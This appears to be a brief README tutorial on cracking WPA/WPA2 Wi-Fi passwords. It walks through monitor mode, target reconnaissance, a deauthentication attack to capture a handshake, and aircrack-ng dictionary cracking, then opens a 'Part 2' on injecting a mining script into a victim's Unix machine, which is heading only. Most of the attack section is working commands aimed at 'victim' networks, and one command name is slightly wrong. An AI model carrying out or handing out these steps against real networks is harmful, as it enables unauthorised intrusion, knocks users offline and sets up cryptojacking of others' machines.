# Gaining access to WPA/WPA2 with short/easy password and inject mining script to Unix victim
Part 1. Gaining access to WIFI:
1. Install kali
2. Buy and hook a NIC (I used alfa awus036neh) that can use monitor mode to VM (assuming your interface name is wlan0)
``` 
ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
OR
airmon-ng start wlan0
```
3. Sniff the environment for victim WIFI and capture bssid of target WIFI (Assuming target bssid is BSSID channel C)
```
airodump-ng wlan0
```
4. Sniff the MAC address of clients connected to it (Assuming target mac is MAC) 
```
airodump-ng --bssid BSSID --channel C --write output wlan0 
```
5. Get the handshake traffic. WPA/WPA2 is more secure than WEP so need to capture WPA/WPA2 handshake traffic since it contains Message Integrity Code (MIC) sent from client during handshake. To get the handshake traffic, use deauthentication attack to kick a currently connected client offline and capture it’s traffic when it reconnects.
```
aireplay --deauth 0 -a BSSID -c MAC wlan0
```
6. Crack the password.
   Get a wordlist. Two approaches for this part. (Assuming wordlist file is wl.txt)a. Downloaded wordlists from https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Lengthb. Generated my custom wordlist. Since when I am attacking my own wifi, I have some information about the password pattern and it makes the process easier. In real world this process is done by social engineering.6b. Then compare it with locally generated MIC from password from wordlist to find the correct password. 
```
aircrack-ng output-01.cap -w wl.txt
```
Part 2. Injecting malicious script to victim machine.

